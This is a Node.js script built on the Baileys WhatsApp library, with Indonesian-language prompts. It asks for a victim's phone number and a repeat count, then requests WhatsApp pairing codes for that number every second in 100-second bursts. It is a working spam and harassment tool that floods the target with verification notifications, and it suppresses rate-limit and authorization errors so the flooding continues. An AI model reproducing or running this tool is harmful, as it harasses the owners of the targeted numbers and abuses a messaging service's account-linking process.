const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require('fs');
const chalk = require("chalk");
const FileType = require("file-type");
const path = require('path');
const axios = require("axios");
const _ = require("lodash");
const moment = require("moment-timezone");
const PhoneNumber = require("awesome-phonenumber");
const {
  default: spamConnect,
  delay,
  PHONENUMBER_MCC,
  makeCacheableSignalKeyStore,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageID,
  downloadContentFromMessage,
  makeInMemoryStore,
  jidDecode,
  proto,
  Browsers
} = require("@whiskeysockets/baileys");
const NodeCache = require("node-cache");
const Pino = require("pino");
const readline = require("readline");
const makeWASocket = require("@whiskeysockets/baileys")['default'];
const store = makeInMemoryStore({
  'logger': pino().child({
    'level': "silent",
    'stream': "store"
  })
});
const pairingCode = true || process.argv.includes("--pairing-code");
const useMobile = process.argv.includes("--mobile");
const rl = readline.createInterface({
  'input': process.stdin,
  'output': process.stdout
});
const question = text => new Promise(resolve => rl.question(text, resolve));
async function startspam() {
  let { 
  version: version, 
  isLatest: isLatest 
  } = await fetchLatestBaileysVersion();
  const {
    state: state,
    saveCreds: saveCreds
  } = await useMultiFileAuthState("./cassaster");
  const msgRetryCounterCache = new NodeCache();
  const spam = makeWASocket({
    'logger': pino({
      'level': "silent"
    }),
    'printQRInTerminal': !pairingCode,
    'browser': Browsers.windows("Firefox"),
    'auth': {
      'creds': state.creds,
      'keys': makeCacheableSignalKeyStore(state.keys, Pino({
        'level': "fatal"
      }).child({
        'level': "fatal"
      }))
    },
    'markOnlineOnConnect': true,
    'generateHighQualityLinkPreview': true,
    'getMessage': async key => {
      if (store) {
        const msg = await store.loadMessage(key.remoteJid, key.id);
        return msg.message || undefined;
      }
      return {
        'conversation': "SPAM PAIRING CODE"
      };
    },
    'msgRetryCounterCache': msgRetryCounterCache,
    'defaultQueryTimeoutMs': undefined
  });
  store.bind(spam.ev);

  if (pairingCode && !spam.authState.creds.registered) {
    if (useMobile) {
      throw new Error("Tidak dapat menggunakan kode pasangan dengan API seluler");
    }
    
    console.log(chalk.bgBlack(chalk.yellowBright("╔═╗╔═╗╔═╗╔═╗╔═╗╔═╗╔╦╗╔═╗╦═╗")));
    console.log(chalk.bgBlack(chalk.blueBright("║  ╠═╣╚═╗╚═╗╠═╣╚═╗ ║ ║╣ ╠╦╝")));
    console.log(chalk.bgBlack(chalk.redBright("╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝ ╩ ╚═╝╩╚═")));
    
    let phoneNumber = await question(chalk.bgBlack(chalk.whiteBright("Input NO Whatsapp: +628xxx : ")));
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
    
    while (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
      console.log(chalk.bgBlack(chalk.yellowBright("╔═╗╔═╗╔═╗╔═╗╔═╗╔═╗╔╦╗╔═╗╦═╗")));
      console.log(chalk.bgBlack(chalk.blueBright("║  ╠═╣╚═╗╚═╗╠═╣╚═╗ ║ ║╣ ╠╦╝")));
      console.log(chalk.bgBlack(chalk.redBright("╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝ ╩ ╚═╝╩╚═")));
      phoneNumber = await question(chalk.bgBlack(chalk.greenBright("Input NO Whatsapp: +628xxx : ")));
    }
    
    let spamCount = parseInt(await question(chalk.bgBlack(chalk.whiteBright("Berapa kali kamu akan spam? : "))), 10);
    
    for (let i = 0; i < spamCount; i++) {
      let second = 100;
      while (second > 0) {
        let code = await spam.requestPairingCode(phoneNumber);
        code = code?.['match'](/.{1,4}/g)?.["join"]('-') || code;
        console.log(chalk.bgBlack(chalk.greenBright("Pairing Code: " + code)));
        console.log(chalk.bgBlack(chalk.whiteBright("Spam Dalam..: " + second + " s...")));
        await new Promise(resolve => setTimeout(resolve, 1000));
        second--;
      }
      console.log(chalk.bgBlack(chalk.redBright(`Spam ke-${i + 1} selesai. Tunggu 30 detik sebelum melanjutkan...`)));
      await new Promise(resolve => setTimeout(resolve, 30000));
    }
    
    console.log(chalk.bgBlack(chalk.greenBright(`Spam selesai sebanyak ${spamCount} kali.`)));
  }

  let file = require.resolve(__filename);
  fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.redBright("Update " + __filename));
    delete require.cache[file];
    require(file);
  });
}

startspam();

process.on("uncaughtexception", function (err) {
  let e = String(err);
  if (e.includes("conflict")) {
    return;
  }
  if (e.includes("Socket connection timeout")) {
    return;
  }
  if (e.includes("not-authorized")) {
    return;
  }
  if (e.includes("already-exists")) {
    return;
  }
  if (e.includes("rate-overlimit")) {
    return;
  }
  if (e.includes("Connection Closed")) {
    return;
  }
  if (e.includes("Timed Out")) {
    return;
  }
  if (e.includes("Value not found")) {
    return;
  }
  console.log("Caught exception: ", err);
});
